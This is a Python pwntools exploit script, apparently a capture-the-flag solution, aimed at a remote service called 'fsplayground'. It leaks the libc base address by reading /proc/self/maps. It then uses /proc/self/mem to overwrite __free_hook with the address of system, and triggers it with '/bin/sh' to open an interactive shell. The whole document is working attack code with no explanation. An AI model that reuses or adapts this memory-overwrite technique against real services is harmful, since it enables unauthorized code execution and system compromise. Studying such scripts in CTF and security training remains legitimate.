from pwn import *


#io=process('./fsplayground')
io=remote('119.3.111.133','6666')
libc=ELF('./libc-2.27.so')

def readfile(size):
	io.recvuntil('choice: ')
	io.sendline('4')
	io.recvuntil('Size:')
	io.sendline(str(size))

def writefile(size,data):
	io.recvuntil('choice: ')
	io.sendline('5')
	io.recvuntil('Size:')
	io.sendline(str(size))
	io.recvuntil('Content:')
	io.send(data)

def close():
	io.recvuntil('choice: ')
	io.sendline('2')

def seek(size):
	io.recvuntil('choice: ')
	io.sendline('3')
	io.recvuntil('Offset: ')
	io.sendline(str(size))	


io.recvuntil('choice: ')
io.sendline('1')
io.recvuntil('Filename: ')
#io.send('/proc/self/maps')
io.send('/proc/self/maps')
io.recvuntil('Option: ')
io.sendline(str(0))

readfile(0x400)
io.recvuntil('[heap]\n')
libc_base=int(io.recv(12),16)
print(hex(libc_base))
free_hook=libc_base+libc.sym['__free_hook']
sys=libc_base+libc.sym['system']
close()

io.recvuntil('choice: ')
io.sendline('1')
io.recvuntil('Filename: ')
#io.send('/proc/self/maps')
io.send('/proc/self/mem')
io.recvuntil('Option: ')
io.sendline(str(1))

seek(free_hook)
writefile(8,p64(sys))
writefile(8,"/bin/sh\x00")

io.interactive()


